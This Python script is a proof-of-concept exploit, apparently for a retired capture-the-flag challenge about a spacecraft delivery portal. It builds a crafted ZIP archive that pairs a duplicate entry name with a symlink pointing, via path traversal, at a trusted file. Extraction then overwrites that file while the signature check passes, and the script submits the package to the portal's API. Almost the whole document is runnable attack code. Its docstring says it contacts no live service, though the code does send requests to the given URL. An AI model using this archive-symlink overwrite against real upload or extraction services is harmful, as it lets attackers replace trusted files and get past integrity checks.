#!/usr/bin/env python3
"""ORRIN-3 / Apogee Delivery Portal — PoC.

Exploit: ZIP duplicate entry names plus an `S_IFLNK` symlink entry. The
verifier resolves name->entry with last-wins on duplicates (the signed,
regular payload entry), while the extractor iterates all entries in order,
creating the symlink first and then following it when writing the "same"
path, overwriting the trusted manoeuvre table through the link. Restores the
validated REVISION 53 table, then unlocks the sealed receipt.

Usage:
    python3 apogee.py [base_url] --table <path-to-validated-r3-manoeuvre.ctab>

Environment:
    APOGEE_TABLE   path to the validated REVISION 53 table (alternative to --table)

The CTF instance is retired; this PoC documents the exploit path and does not
contact any live service.
"""

import argparse
import hashlib
import io
import json
import os
import stat
import sys
import zipfile

import requests

# Documented constants from the retired-challenge writeup.
PACKAGE_ID = "PKG-RESTORE-R53"
SPACECRAFT = "ORRIN-3"
TABLE_NAME = "r3-manoeuvre.ctab"
ENTRY_PATH = f"tables/{TABLE_NAME}"
SYMLINK_TARGET = "../../../trusted/ops/r3-manoeuvre.ctab"
VALIDATED_SHA256 = "824048d585827e94b48a46a7fbe66aeae2080671975f5380c29fe80596a02796"
VALIDATED_SIZE = 837
MANIFEST_CREATED = "2026-11-06T14:45:00Z"
VENDOR = "NSOC Analyst Desk"


def build_restore_package(table_bytes: bytes) -> bytes:
    """Symlink entry first (verifier skips it as a name duplicate), payload last."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        link = zipfile.ZipInfo(ENTRY_PATH)
        link.create_system = 3  # Unix, so external_attr permission bits are honoured
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        zf.writestr(link, SYMLINK_TARGET)
        zf.writestr(ENTRY_PATH, table_bytes)
    return buf.getvalue()


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("base_url", nargs="?", default="http://<instance>")
    parser.add_argument("--table", default=os.environ.get("APOGEE_TABLE"),
                        help="path to the validated REVISION 53 table (837 bytes)")
    args = parser.parse_args()

    if not args.table:
        # TODO: supply --table / APOGEE_TABLE pointing at the validated REVISION
        # 53 table; its bytes are not part of the writeup.
        parser.error("--table (or APOGEE_TABLE) is required: validated table bytes unavailable")
    with open(args.table, "rb") as fh:
        table_bytes = fh.read()
    digest = hashlib.sha256(table_bytes).hexdigest()
    print(f"[*] table: {len(table_bytes)} bytes sha256={digest}")
    if digest != VALIDATED_SHA256 or len(table_bytes) != VALIDATED_SIZE:
        print("[!] warning: table does not match the documented validated "
              f"REVISION 53 (size {VALIDATED_SIZE}, sha256 {VALIDATED_SHA256})")

    base = args.base_url
    session = requests.Session()

    print("[*] recon: /api/v1/status, /reference/validated")
    for path in ("/api/v1/status", "/reference/validated"):
        r = session.get(f"{base}{path}", timeout=15)
        print(f"    {path} -> {r.status_code} {r.text[:300]}")

    package = build_restore_package(table_bytes)
    manifest = {
        "package_id": PACKAGE_ID,
        "spacecraft": SPACECRAFT,
        "table": TABLE_NAME,
        "vendor": VENDOR,
        "created": MANIFEST_CREATED,
        "members": [{"path": ENTRY_PATH, "size": len(table_bytes), "sha256": digest}],
    }
    print(f"[*] submitting restore package {PACKAGE_ID} ({len(package)} bytes zip)")
    r = session.post(
        f"{base}/api/v1/submissions",
        files={
            "manifest": (None, json.dumps(manifest), "application/json"),
            "package": (f"{PACKAGE_ID}.zip", package, "application/zip"),
        },
        timeout=30,
    )
    print(f"    /api/v1/submissions -> {r.status_code} {r.text[:300]}")

    print("[*] verify: /api/v1/status now reports the validated table")
    r = session.get(f"{base}/api/v1/status", timeout=15)
    print(f"    /api/v1/status -> {r.status_code} {r.text[:300]}")

    unlock = hashlib.sha256(
        f"apogee|{SPACECRAFT}|{VALIDATED_SHA256}|{PACKAGE_ID}".encode()
    ).hexdigest()
    print(f"[*] receipt unlock digest: {unlock}")
    r = session.get(f"{base}/api/v1/pass/receipt", params={"unlock": unlock}, timeout=15)
    print(f"    /api/v1/pass/receipt -> {r.status_code} {r.text}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
